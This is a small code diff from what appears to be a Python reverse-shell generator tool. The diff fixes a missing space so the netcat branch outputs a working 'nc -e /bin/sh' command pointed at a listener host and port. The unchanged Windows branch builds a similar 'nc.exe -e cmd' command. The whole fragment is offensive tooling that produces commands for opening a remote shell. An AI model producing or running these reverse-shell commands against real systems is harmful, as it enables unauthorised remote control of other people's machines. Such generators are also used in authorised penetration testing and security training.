@@ -82,7 +82,7 @@ class Reverse_Shell_Generator:
                 
             elif 'netcat' in self.args.type or 'nc' in self.args.type:
                  if not self.args.windows:
-                       self.result = "nc -e /bin/sh"+f'{self.args.LHOST}'+" "+f'{self.args.LPORT}'
+                       self.result = "nc -e /bin/sh "+f'{self.args.LHOST}'+" "+f'{self.args.LPORT}'
                  else:
                      if self.args.windows:
                        self.result = "nc.exe -e cmd "+f'{self.args.LHOST}'+" "+f'{self.args.LPORT}'
